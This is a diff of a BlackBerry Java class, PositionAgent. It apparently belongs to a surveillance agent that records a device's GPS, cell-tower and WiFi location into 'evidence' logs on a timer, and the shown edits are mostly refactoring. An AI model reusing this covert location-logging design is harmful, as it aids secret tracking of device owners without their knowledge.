@@ -18,11 +18,11 @@ import javax.microedition.location.LocationProvider;
 import javax.microedition.location.QualifiedCoordinates;
 
 import net.rim.device.api.system.CDMAInfo;
+import net.rim.device.api.system.CDMAInfo.CDMACellInfo;
 import net.rim.device.api.system.GPRSInfo;
+import net.rim.device.api.system.GPRSInfo.GPRSCellInfo;
 import net.rim.device.api.system.RadioInfo;
 import net.rim.device.api.system.WLANInfo;
-import net.rim.device.api.system.CDMAInfo.CDMACellInfo;
-import net.rim.device.api.system.GPRSInfo.GPRSCellInfo;
 import net.rim.device.api.system.WLANInfo.WLANAPInfo;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.Device;
@@ -38,7 +38,6 @@ import blackberry.utils.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 
-// TODO: Auto-generated Javadoc
 /**
  * The Class PositionAgent.
  */
@@ -52,6 +51,7 @@ public final class PositionAgent extends Agent implements LocationObserver {
     private static final int LOG_TYPE_WIFI = 3;
     private static final int LOG_TYPE_IP = 4;
     private static final int LOG_TYPE_CDMA = 5;
+    private static final long POSITION_DELAY = 1000;
     //private static final int TYPE_GPS_ASSISTED = 3;
 
     Evidence logGps;
@@ -59,7 +59,7 @@ public final class PositionAgent extends Agent implements LocationObserver {
     Evidence logWifi;
 
     //#ifdef DEBUG
-    static Debug debug = new Debug("PositionAgent", DebugLevel.VERBOSE);
+    static Debug debug = new Debug("PositionAgent", DebugLevel.INFORMATION);
     //#endif
 
     // LOGGER_GPS  1 // Prendi la posizione dal GPS
@@ -227,8 +227,8 @@ public final class PositionAgent extends Agent implements LocationObserver {
             //#ifdef DEBUG
             debug.info("Wifi: " + wifi.getBSSID());
             //#endif
-            final byte[] payload = getWifiPayload(wifi.getBSSID(), wifi
-                    .getSSID(), wifi.getSignalLevel());
+            final byte[] payload = getWifiPayload(wifi.getBSSID(),
+                    wifi.getSSID(), wifi.getSignalLevel());
 
             logWifi.createEvidence(getAdditionalData(1, LOG_TYPE_WIFI),
                     EvidenceType.LOCATION_NEW);
@@ -412,7 +412,6 @@ public final class PositionAgent extends Agent implements LocationObserver {
         //#endif
 
         final int version = 2008121901;
-        final int delimiter = 0xABADC0DE;
         final Date date = new Date();
         final int payloadSize = payload.length;
         final int size = payloadSize + 24;
@@ -432,16 +431,17 @@ public final class PositionAgent extends Agent implements LocationObserver {
         databuffer.write(payload);
 
         // delimiter
-        databuffer.writeInt(delimiter);
+        databuffer.writeInt(Evidence.EVIDENCE_DELIMITER);
 
         //#ifdef DBC
-        Check.ensures(databuffer.getPosition() == size, "saveEvidence wrong size");
+        Check.ensures(databuffer.getPosition() == size,
+                "saveEvidence wrong size");
         //#endif
 
         // save log
-        //log.createLog(null, LogType.LOCATION);
+
         acutalEvidence.writeEvidence(message);
-        //log.close();
+
     }
 
     private byte[] getWifiPayload(String bssid, String ssid, int signalLevel) {
@@ -463,9 +463,7 @@ public final class PositionAgent extends Agent implements LocationObserver {
             //#endif
 
             //#ifdef DBC
-            Check
-                    .asserts(token.length == 1,
-                            "getWifiPayload: token wrong size");
+            Check.asserts(token.length == 1, "getWifiPayload: token wrong size");
             //#endif
             databuffer.writeByte(token[0]);
         }
@@ -673,7 +671,7 @@ public final class PositionAgent extends Agent implements LocationObserver {
             //#endif
 
             setPeriod(period);
-            setDelay(period);
+            setDelay(POSITION_DELAY);
 
         } catch (final EOFException e) {
             //#ifdef DEBUG
